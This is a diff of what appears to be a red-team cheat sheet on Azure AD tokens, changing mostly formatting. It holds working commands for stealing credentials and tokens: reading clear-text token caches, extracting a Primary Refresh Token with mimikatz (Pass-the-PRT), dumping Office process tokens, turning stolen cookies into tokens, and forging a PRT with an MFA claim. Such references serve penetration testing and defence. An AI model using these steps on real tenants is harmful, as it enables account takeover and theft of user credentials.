@@ -8,21 +8,23 @@ When you authenticate to the Microsoft Graph API in PowerShell/CLI, you will be 
 
 | Name                       | Application ID                       |
 |----------------------------|--------------------------------------|
-| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |	
-| Microsoft Azure CLI	     | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
-| Portail Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |	
+| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |
+| Microsoft Azure CLI      | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
+| Portail Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |
 
 After a successfull authentication, you will get an access token.
-
 
 ### az cli
 
 * Login with credentials
+
     ```ps1
     az login -u <username> -p <password>
     az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
     ```
+
 * Get token
+
     ```ps1
     az account get-access-token
     az account get-access-token --resource-type aad-graph
@@ -30,57 +32,63 @@ After a successfull authentication, you will get an access token.
 
 Whoami equivalent: `az ad signed-in-user show`
 
-
 ### Azure AD Powershell
 
 * Login with credentials
+
     ```ps1
     $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
     $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
     Connect-AzureAD -Credential $creds
     ```
 
-
 ### Az Powershell
 
 * Login with credentials
+
     ```ps1
     $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
     $creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>@<TENANT NAME>.onmicrosoft.com", $passwd)
     Connect-AzAccount -Credential $creds
     ```
+
 * Login with service principal secret
+
     ```ps1
     $password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
     $creds = New-Object System.Management.Automation.PSCredential('<APP-ID>', $password)
     Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d
 
     ```
+
 * Get token
+
     ```ps1
     (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
     Get-AzAccessToken -ResourceTypeName MSGraph
     ```
 
-
 ### Microsoft Graph Powershell
 
 * Login with credentials
+
     ```ps1
     Connect-MgGraph
     Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All"
     ```
+
 * Login with device code flow
+
     ```ps1
     Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All" -UseDeviceAuthentication
     ```
 
 Whoami equivalent: `Get-MgContext`
 
-
 ### External HTTP API
 
 * Login with credentials
+
     ```ps1
     # TODO
     ```
@@ -123,10 +131,10 @@ $Tokens = Invoke-RestMethod `
 $Tokens
 ```
 
-
-#### Service Principal 
+#### Service Principal
 
 * Request an access token using a **service principal password**
+
     ```ps1
     curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token' \
     --header 'Content-Type: application/x-www-form-urlencoded' \
@@ -160,27 +168,28 @@ $connection = Invoke-RestMethod `
 Connect-MgGraph -AccessToken $connection.access_token
 ```
 
-
 ### Internal HTTP API
 
 > **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.
 
 Find `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` from the environment variables: `env`
 
-Most of the time, you want a token for one of these resources: 
+Most of the time, you want a token for one of these resources:
 
-* https://graph.microsoft.com
-* https://management.azure.com
-* https://storage.azure.com
-* https://vault.azure.net
-
+* <https://graph.microsoft.com>
+* <https://management.azure.com>
+* <https://storage.azure.com>
+* <https://vault.azure.net>
 
 * PowerShell
+
     ```ps1
     curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
     curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
     ```
+
 * Azure Function (Python)
+
     ```py
     import logging, os
     import azure.functions as func
@@ -194,7 +203,6 @@ Most of the time, you want a token for one of these resources:
         return func.HttpResponse(val, status_code=200)
     ```
 
-
 ## Access Token
 
 An access token is a type of security token issued by Azure Active Directory (Azure AD) that grants a user or application permission to access resources. These resources could be anything from APIs, web applications, data stored in Azure, or other services that are integrated with Azure AD for authentication and authorization.
@@ -202,22 +210,29 @@ An access token is a type of security token issued by Azure Active Directory (Az
 Decode access tokens: [jwt.ms](https://jwt.ms/)
 
 * Use the access token with **MgGraph**
+
     ```ps1
     # use the jwt
     $token = "eyJ0eXAiO..."
     $secure = $token | ConvertTo-SecureString -AsPlainText -Force
     Connect-MgGraph -AccessToken $secure
     ```
+
 * Use the access token with **AzureAD**
+
     ```powershell
     Connect-AzureAD -AadAccessToken <access-token> -TenantId <tenant-id> -AccountId <account-id>
     ```
+
 * Use the access token with **Az Powershell**
+
     ```powershell
     Connect-AzAccount -AccessToken <access-token> -AccountId <account-id>
     Connect-AzAccount -AccessToken <access-token> -GraphAccessToken <graph-access-token> -AccountId <account-id>
     ```
+
 * Use the access token with the **API**
+
     ```powershell
     $Token = 'eyJ0eX..'
     $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
@@ -232,7 +247,6 @@ Decode access tokens: [jwt.ms](https://jwt.ms/)
     (Invoke-RestMethod @RequestParams).value 
     ```
 
-
 ### Access Token Locations
 
 Tokens are stored by default on the disk in you use **Azure Cloud Shell**. They canbe extracted by dumping the content of the storage account.
@@ -243,17 +257,16 @@ Tokens are stored by default on the disk in you use **Azure Cloud Shell**. They 
 
 * Az PowerShell
     * Az PowerShell stores access tokens in clear text in **TokenCache.dat** in the directory `C:\Users\<username>\.Azure`
-    * It also stores **ServicePrincipalSecret** in clear-text in **AzureRmContext.json** 
+    * It also stores **ServicePrincipalSecret** in clear-text in **AzureRmContext.json**
     * Users can save tokens using `Save-AzContext`
-
 
 ## Refresh Token
 
 * Requesting a token using credentials
+
     ```ps1
     TODO
     ```
-
 
 ### Get a Refresh Token from ESTSAuth Cookie
 
@@ -264,15 +277,14 @@ TokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie "0.AS8"
 TokenTacticsV2> Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
 ```
 
-
 ### Get a Refresh Token from Office process
 
 * [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)
+
 ```ps1
 load bofloader
 execute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324
 ```
-
 
 ## FOCI Refresh Token
 
@@ -280,14 +292,14 @@ FOCI allows applications registered with Azure AD to share tokens, minimizing th
 
 * [secureworks/family-of-client-ids-research/](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) - Research into Undocumented Behavior of Azure AD Refresh Tokens
 
-**Generate tokens**   
+**Generate tokens**
 
 ```ps1
 roadtx gettokens --refresh-token <refresh-token> -c <foci-id> -r https://graph.microsoft.com 
 roadtx gettokens --refresh-token <refresh-token> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46
 ```
 
-```
+```ps1
 scope               resource                                client                              
 .default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46
                     1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2
@@ -305,25 +317,25 @@ Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9
                     https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2
 ```
 
-
 ## Primary Refresh Token
 
-A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices. 
+A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices.
 
-:warning: A PRT is valid for 90 days and is continuously renewed as long as the device is in use. However, it's only valid for 14 days if the device is not in use. 
+:warning: A PRT is valid for 90 days and is continuously renewed as long as the device is in use. However, it's only valid for 14 days if the device is not in use.
 
 * Use PRT token
+
     ```ps1
     roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
     roadtx browserprtauth --prt roadtx.prt -url http://www.office.com
     ```
-
 
 ### Extract PRT v1 - Pass-the-PRT
 
 MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).
 
 * Use mimikatz to extract the PRT and session key
+
     ```ps1
     mimikatz # privilege::debug
     mimikatz # token::elevate
@@ -332,7 +344,9 @@ MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joine
     mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
     mimikatz # dpapi::cloudapkd /context:<context> /derivedkey:<derived-key> /Prt:<prt>
     ```
+
 * Use either roadtx or AADInternals to generate a new PRT token
+
     ```ps1
     roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com
 
@@ -345,11 +359,9 @@ MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joine
     PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
     ```
 
-
 ### Extract PRT on Device with TPM
 
 * No method known to date.
-
 
 ### Request a PRT using the Refresh Flow
 
@@ -357,6 +369,7 @@ MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joine
 * Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.
 * `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
 * Then browse to [login.microsoftonline.com](https://login.microsoftonline.com) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
+
     ```powershell
     Name: x-ms-RefreshTokenCredential
     Value: <Signed JWT>
@@ -364,7 +377,6 @@ MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joine
     ```
 
 :warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.
-
 
 ### Request a PRT with Hybrid Device
 
@@ -385,7 +397,6 @@ Use the user account to create a computer and request a PRT
     roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
     ```
 
-
 ### Upgrade Refresh Token to PRT
 
 * Get correct token audience: `roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file`
@@ -393,12 +404,10 @@ Use the user account to create a computer and request a PRT
 * Request PRT `roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key`
 * Use a PRT: `roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com`
 
-
 ### Enriching a PRT with MFA claim
 
 * Request a special refresh token: `roadtx prtenrich -u username@domain`
 * Request a PRT with MFA claim: `roadtx prt -r <refreshtoken> -c <device>.pem -k <device>.key`
-
 
 ## References
 
